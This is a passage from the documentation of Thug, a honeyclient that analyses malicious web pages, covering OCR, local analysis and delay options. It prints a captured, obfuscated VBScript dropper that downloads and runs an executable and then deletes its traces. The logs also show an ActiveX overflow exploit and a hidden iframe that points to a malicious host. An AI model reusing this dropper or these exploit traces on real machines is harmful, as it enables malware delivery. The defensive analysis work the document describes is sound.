        w=3000:x=200:y=1:z=false:a = "http://[omitted]/w.php?e=5&f=b081d":Set e = Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS")):Set f=e.GetSpecialFolder(2):b = f & "\exe.ex2":b=Replace(b,Month("2010-02-16"),"e"):OT = "GET":Set c = CreateObject(StrReverse("PTTHLMX.2LMXSM")):Set d = CreateObject(StrReverse("ertS.BDODA") & "am")  
        Set o=Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
        On Error resume next
        c.open OT, a, z:c.send()  
        If c.Status = x Then  
        d.Open:d.Type = y:d.Write c.ResponseBody:d.SaveToFile b:d.Close  
        End If  
        Set w=CreateObject(StrReverse("llehS." & "tpi"&"rcSW"))
        Eval(Replace("W.ex2c b", Month("2010-02-16"), "E"))
        W.eXeC "taskkill /F /IM wm" & "player.e" & "xe":W.eXeC "taskkill /F /IM realplay.ex" & "e":Set g=o.GetFile(e.GetSpecialFolder(3-1) & "\" & StrReverse("bv.l") & "s"):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval("g.Delete")

        [2012-07-02 19:22:32] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&f=b081d
        [2012-07-02 19:22:38] [HTTP] URL: http://[omitted]/w.php?e=5&f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:22:39] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a
        [2012-07-02 19:22:39] <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" height="10" id="swf_id" width="10"><param name="movie" value="data/field.swf"></param><param name="allowScriptAccess" value="always"></param><param name="Play" value="0"></param><embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"></embed></object>
        [2012-07-02 19:22:39] <param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"></param>
        [2012-07-02 19:22:39] <param name="movie" value="data/field.swf"></param>
        [2012-07-02 19:22:39] [Navigator URL Translation] data/field.swf -->  http://[omitted]/data/field.swf
        [2012-07-02 19:22:46] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:22:46] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
        [2012-07-02 19:22:46] <param name="allowScriptAccess" value="always"></param>
        [2012-07-02 19:22:46] <param name="Play" value="0"></param>
        [2012-07-02 19:22:46] <embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"></embed>
        [2012-07-02 19:22:46] [Navigator URL Translation] data/field.swf -->  http://[omitted]/data/field.swf
        [2012-07-02 19:22:49] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:22:49] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)


Image processing
----------------

Image processing analysis (introduced in Thug 1.4) allows to analyze images retrieved during the
analysis. By default, Thug performs OCR analysis returning extracted strings but the possibility
exists to include other image processing algorithms through using Thug PyHooks. Be aware that
*pytesseract* is required to perform OCR analysis but this dependency is not installed by default
as the required steps could be different based on the Linux distribution. Please look at the section
*INSTALLATION* at https://github.com/madmaze/pytesseract for additional details.

.. code-block:: sh

    ~ $ thug -u win7ie90 -U -Y --image-processing www.google.com
    [2020-04-09 12:18:51] [window open redirection] about:blank -> http://www.google.com
    [2020-04-09 12:18:51] [HTTP Redirection (Status: 302)] Content-Location: http://www.google.com/ --> Location: https://www.google.com/?gws_rd=ssl
    [2020-04-09 12:18:51] [HTTP] URL: https://www.google.com/?gws_rd=ssl (Status: 200, Referer: None)
    [2020-04-09 12:18:51] [HTTP] URL: https://www.google.com/?gws_rd=ssl (Content-type: text/html; charset=UTF-8, MD5: 6f1b8888e766930d42eda071cece248a)
    [2020-04-09 12:18:52] [script src redirection] https://www.google.com/?gws_rd=ssl -> https://ssl.gstatic.com/gb/js/sem_574dafda1e043a99f540fbc649850c73.js
    [2020-04-09 12:18:52] [HTTP] URL: https://ssl.gstatic.com/gb/js/sem_574dafda1e043a99f540fbc649850c73.js (Status: 200, Referer: https://www.google.com/?gws_rd=ssl)
    [2020-04-09 12:18:52] [HTTP] URL: https://ssl.gstatic.com/gb/js/sem_574dafda1e043a99f540fbc649850c73.js (Content-type: text/javascript, MD5: f9acfd15f94beb685f01c6d6df397ff6)
    [2020-04-09 12:18:52] [Navigator URL Translation] /images/branding/googlelogo/1x/googlelogo_white_background_color_272x92dp.png --> https://www.google.com/images/branding/googlelogo/1x/googlelogo_white_background_color_272x92dp.png
    [2020-04-09 12:18:52] [img redirection] https://www.google.com/?gws_rd=ssl -> https://www.google.com/images/branding/googlelogo/1x/googlelogo_white_background_color_272x92dp.png
    [2020-04-09 12:18:52] [HTTP] URL: https://www.google.com/images/branding/googlelogo/1x/googlelogo_white_background_color_272x92dp.png (Status: 200, Referer: https://www.google.com/?gws_rd=ssl)
    [2020-04-09 12:18:52] [HTTP] URL: https://www.google.com/images/branding/googlelogo/1x/googlelogo_white_background_color_272x92dp.png (Content-type: image/png, MD5: b593548ac0f25135c059a0aae302ab4d)
    [2020-04-09 12:18:52] [OCR] Result: Google (URL: https://www.google.com/images/branding/googlelogo/1x/googlelogo_white_background_color_272x92dp.png)
    [..]


Local Analysis
--------------

May you need to analyze a locally saved page Thug provides the *-l (--local)* option to you.
Using such option is really simple and could turn to be really useful for testing and for 
later (manual or automated) analysis (see also *Web Cache*)

.. code-block:: sh

        ~/thug/src $ thug -l ../samples/exploits/4042.html 
        [2012-07-03 00:12:23] <object classid="clsid:DCE2F8B1-A520-11D4-8FD0-00D0B7730277" id="target"></object>
        [2012-07-03 00:12:23] ActiveXObject: DCE2F8B1-A520-11D4-8FD0-00D0B7730277
        [2012-07-03 00:12:23] [Yahoo! Messenger 8.x Ywcvwr ActiveX] Server Console Overflow
        [2012-07-03 00:12:23] UINT WINAPI WinExec (
                LPCSTR = 0x025d4b30 => 
                        = "calc.exe";
                UINT uCmdShow = 0;
        ) =  32;
        void ExitProcess (
                UINT uExitCode = 0;
        ) =  0;


If you need to prevent remote content fetching while analyzing a locally saved page Thug
provides the *-x (--local-nofetch)* option to you. Let's take a look at an example.

.. code-block:: sh

    ~/thug/src $ thug -l ../samples/exploits/55875.html 
    [2013-01-08 10:32:28] <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
    [2013-01-08 10:32:28] <meta content="Acer Inc.'s shares fell sharply Tuesday, one day after the Taiwanese computer maker said it would acquire Gateway Inc. for $710 million.  Acer said it ..." name="description"/>
    [2013-01-08 10:32:28] <meta content="index,follow" name="robots"/>
    [2013-01-08 10:32:28] <meta content="Copyright (c)2007-2007 groundhogtech.com. All right reserved." name="copyright"/>
    [2013-01-08 10:32:28] <meta content="WordPress 2.2.1" name="generator"/>
    [2013-01-08 10:32:28] [Meta] Generator: WordPress 2.2.1
    [2013-01-08 10:32:28] <meta content="document" name="resource-type"/>
    [2013-01-08 10:32:28] <link href="http://www.groundhogtech.com/favicon.ico" rel="shortcut icon"/>
    [2013-01-08 10:32:28] [HTTP] URL: http://www.groundhogtech.com/favicon.ico (Status: 204, Referrer: None)
    [2013-01-08 10:32:28] [HTTP] URL: http://www.groundhogtech.com/favicon.ico (Content-type: text/plain; charset=UTF-8, MD5: d41d8cd98f00b204e9800998ecf8427e)
    [2013-01-08 10:32:28] <link href="http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css" media="screen" rel="stylesheet" type="text/css"/>
    [2013-01-08 10:32:29] [HTTP] URL: http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css (Status: 200, Referrer: None)
    [2013-01-08 10:32:29] [HTTP] URL: http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css (Content-type: text/html; charset=UTF-8, MD5: 64f3fd00b16de9316bf2b7b57925f4ca)
    [2013-01-08 10:32:29] <link href="http://www.groundhogtech.com/feed/" rel="alternate" title="Groundhogtech RSS Feed" type="application/rss+xml"/>
    [2013-01-08 10:32:30] [HTTP] URL: http://www.groundhogtech.com/feed/ (Status: 200, Referrer: None)
    [2013-01-08 10:32:30] [HTTP] URL: http://www.groundhogtech.com/feed/ (Content-type: text/html; charset=UTF-8, MD5: 0f3dffbe75d901cf28d63f2e8c945815)
    [2013-01-08 10:32:30] <link href="http://www.groundhogtech.com/xmlrpc.php" rel="pingback"/>
    [2013-01-08 10:32:30] [HTTP] URL: http://www.groundhogtech.com/xmlrpc.php (Status: 200, Referrer: None)
    [2013-01-08 10:32:30] [HTTP] URL: http://www.groundhogtech.com/xmlrpc.php (Content-type: text/html; charset=UTF-8, MD5: ce1ec1253cf77acb1a86d38c80a83ca2)
    [2013-01-08 10:32:30] <link href="http://www.groundhogtech.com/xmlrpc.php?rsd" rel="EditURI" title="RSD" type="application/rsd+xml"/>
    [2013-01-08 10:32:31] [HTTP] URL: http://www.groundhogtech.com/xmlrpc.php?rsd (Status: 200, Referrer: None)
    [2013-01-08 10:32:31] [HTTP] URL: http://www.groundhogtech.com/xmlrpc.php?rsd (Content-type: text/html; charset=UTF-8, MD5: d178bfd11bc1b88fc37be47b515210eb)
    [2013-01-08 10:32:31] [HTTP] URL: http://www.vklabs.com/wordpress-themes/show-version-xhtml-ad-flex-niche.php?version=0.8.9.8h (Status: 200, Referrer: None)
    [2013-01-08 10:32:31] [HTTP] URL: http://www.vklabs.com/wordpress-themes/show-version-xhtml-ad-flex-niche.php?version=0.8.9.8h (Content-type: text/html, MD5: cd382dd315e1c83a108dd8009bad9f70)
    [2013-01-08 10:32:32] <iframe frameborder="0" height="0" marginheight="0" marginwidth="0" scrolling="no" src="http://81.95.149.27/go.php?sid=1" style="border:0px solid gray;" width="0"></iframe>
    [2013-01-08 10:32:32] [iframe redirection] about:blank -> http://81.95.149.27/go.php?sid=1
    [2013-01-08 10:32:42] [HTTP] URL: http://81.95.149.27/go.php?sid=1 (Status: 408, Referrer: None)
    [2013-01-08 10:32:42] [Request Timeout] URL: http://81.95.149.27/go.php?sid=1
    [2013-01-08 10:32:42] <iframe frameborder="0" height="0" marginheight="0" marginwidth="0" scrolling="no" src="http://81.95.149.27/go.php?sid=1" style="border:0px solid gray;" width="0"></iframe>
    [2013-01-08 10:32:42] [iframe redirection] about:blank -> http://81.95.149.27/go.php?sid=1
    [2013-01-08 10:32:52] [HTTP] URL: http://81.95.149.27/go.php?sid=1 (Status: 408, Referrer: None)
    [2013-01-08 10:32:52] [Request Timeout] URL: http://81.95.149.27/go.php?sid=1

This is what we expect. Let's prevent remote content fetching now while analyzing the same
locally saved page.

.. code-block:: sh

    ~/thug/src $ thug -x ../samples/exploits/55875.html 
    [2013-01-08 10:33:00] <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
    [2013-01-08 10:33:00] <meta content="Acer Inc.'s shares fell sharply Tuesday, one day after the Taiwanese computer maker said it would acquire Gateway Inc. for $710 million.  Acer said it ..." name="description"/>
    [2013-01-08 10:33:00] <meta content="index,follow" name="robots"/>
    [2013-01-08 10:33:00] <meta content="Copyright (c)2007-2007 groundhogtech.com. All right reserved." name="copyright"/>
    [2013-01-08 10:33:00] <meta content="WordPress 2.2.1" name="generator"/>
    [2013-01-08 10:33:00] [Meta] Generator: WordPress 2.2.1
    [2013-01-08 10:33:00] <meta content="document" name="resource-type"/>
    [2013-01-08 10:33:00] <link href="http://www.groundhogtech.com/favicon.ico" rel="shortcut icon"/>
    [2013-01-08 10:33:00] <link href="http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css" media="screen" rel="stylesheet" type="text/css"/>
    [2013-01-08 10:33:00] <link href="http://www.groundhogtech.com/feed/" rel="alternate" title="Groundhogtech RSS Feed" type="application/rss+xml"/>
    [2013-01-08 10:33:00] <link href="http://www.groundhogtech.com/xmlrpc.php" rel="pingback"/>
    [2013-01-08 10:33:01] <link href="http://www.groundhogtech.com/xmlrpc.php?rsd" rel="EditURI" title="RSD" type="application/rsd+xml"/>
    [2013-01-08 10:33:01] <iframe frameborder="0" height="0" marginheight="0" marginwidth="0" scrolling="no" src="http://81.95.149.27/go.php?sid=1" style="border:0px solid gray;" width="0"></iframe>
 

Other useful features
---------------------

An interesting feature (introduced in Thug 0.4.13) allows you to define a maximum delay for
methods like setTimeout and setInterval which set a delay for executing a function. For instance
if the original code contains a statement like 

.. code-block:: javascript

        setTimeout(do_stuff, 60000);

the code will sleep for 60 seconds before executing the function `do_stuff`. There are situations
where you would like to avoid wasting this time. In such cases, Thug provides the -w (--delay)
option. Simply running Thug this way (please note the interval is expressed in milliseconds)

.. code-block:: sh
 
         ~ $ thug -w 2000 "http://[omitted]/main.php?page=8c6c59becaa0da07"
 
will force a maximum delay of 2 seconds. 
